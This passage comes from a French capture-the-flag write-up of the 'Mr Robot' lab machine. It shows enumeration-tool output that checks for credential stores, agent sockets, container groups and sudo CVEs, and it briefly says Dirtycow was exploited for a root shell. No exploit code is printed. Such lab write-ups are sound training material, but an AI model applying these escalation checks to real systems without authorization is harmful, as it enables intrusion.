</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof070 Can we write to a ssh-agent socket?............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof080 Can we write to a gpg-agent socket?............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof090 Found any keepass database files?............................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof100 Found any &#39;</span>pass<span style="color:#5af78e">&#39; store directories?............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof110 Are there any tmux sessions available?.......................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sof120 Are there any tmux sessions from other users?................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof130 Can we write to tmux session sockets from other users?.......... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof140 Are any screen sessions available?.............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sof150 Are there any screen sessions from other users?................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof160 Can we write to screen session sockets from other users?........ nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sof170 Can we access MongoDB databases without credentials?............ nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof180 Can we access any Kerberos credentials?......................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sof500 Sudo version.................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sof510 MySQL version................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sof520 Postgres version................................................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sof530 Apache version.................................................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sof540 Tmux version.................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sof550 Screen version.................................................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">=============================================================( containers )=====
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ctn000 Are we in a docker container?................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ctn010 Is docker available?............................................ nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] ctn020 Is the user a member of the &#39;</span>docker<span style="color:#ff5c57">&#39;</span> group?..................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> ctn200 Are we in a lxc container?...................................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> ctn210 Is the user a member of any lxc/lxd group?...................... <span style="color:#ff5c57">nope</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">==============================================================(</span> processes <span style="color:#ff6ac1">)=====</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> pro000 Waiting <span style="color:#ff6ac1">for</span> the process monitor to finish....................... yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> pro001 Retrieving process binaries..................................... yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> pro002 Retrieving process users........................................ yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> pro010 Can we write in any process binary?............................. nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> pro020 Processes running with root permissions......................... yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> pro030 Processes running by non-root users with shell.................. nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> pro500 Running processes............................................... skip
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> pro510 Running process binaries and permissions........................ <span style="color:#ff5c57">skip</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===================================================================(</span> CVEs <span style="color:#ff6ac1">)=====</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> cve-2019-5736 Escalate in some types of docker containers.............. nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> cve-2021-3560 Checking <span style="color:#ff6ac1">for</span> policykit vulnerability..................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> cve-2021-4034 Checking <span style="color:#ff6ac1">for</span> PwnKit vulnerability........................ nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> cve-2022-0847 Dirty Pipe vulnerability................................. nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> cve-2022-25636 Netfilter linux kernel vulnerability.................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> cve-2023-22809 Sudoedit bypass in Sudo &lt;<span style="color:#ff6ac1">=</span> 1.9.12p1..................... yes!
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>Vulnerable! sudo version: 1.8.9p5-1ubuntu1.1
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">==================================(</span> FINISHED <span style="color:#ff6ac1">)==================================</span></span></span></code></pre></div></div></details>
<h3 id="dirtycow">Dirtycow<a class="anchor" href="#dirtycow">#</a></h3>
<p>L&rsquo;énumération nous montre une faille possible avec dirtycow. On exploite directement la faille et on obtient un shell root pour notre dernier drapeau.</p>
<p><img src="../img/mrrobot_root.png" alt="root" /></p>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">

<div>

</div>

<div>

</div>

</div>





  
  
  
  <div class="flex flex-wrap justify-between">
    <span>
    
      <a href="/docs/writeups/vm/collapsed/hammer/" class="flex align-center">
        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
        <span>Hammer</span>
      </a>
    
    </span>
    <span>
    
      <a href="/docs/writeups/vm/collapsed/rootme/" class="flex align-center">
        <span>RootMe</span>
        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
      </a>
    
    </span>
  </div>
  


 
        
  
  <div class="book-comments">

</div>
  
 
        
        
  
 
        
  
  
    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
  

      </footer>

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
  
  <aside class="book-toc">
    <div class="book-toc-content">
      
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#mr-robot">Mr Robot</a>
      <ul>
        <li><a href="#reconnaissance">Reconnaissance</a></li>
        <li><a href="#acces-a-lapplication">Acces a l&rsquo;application</a>
          <ul>
            <li><a href="#robotstxt">robots.txt</a></li>
            <li><a href="#fuzzing--bruteforce">Fuzzing &amp; Bruteforce</a></li>
          </ul>
        </li>
        <li><a href="#shell">Shell</a>
          <ul>
            <li><a href="#wordpress-plugin">Wordpress Plugin</a></li>
            <li><a href="#utilisateur-robot">Utilisateur robot</a></li>
            <li><a href="#hashcat">Hashcat</a></li>
          </ul>
        </li>
        <li><a href="#escalade-de-privilege">Escalade de privilege</a>
          <ul>
            <li><a href="#enumeration-avec-les">Enumeration avec LES</a></li>
            <li><a href="#dirtycow">Dirtycow</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>



    </div>
  </aside>
  
 
  </main>

  
</body>
</html>




















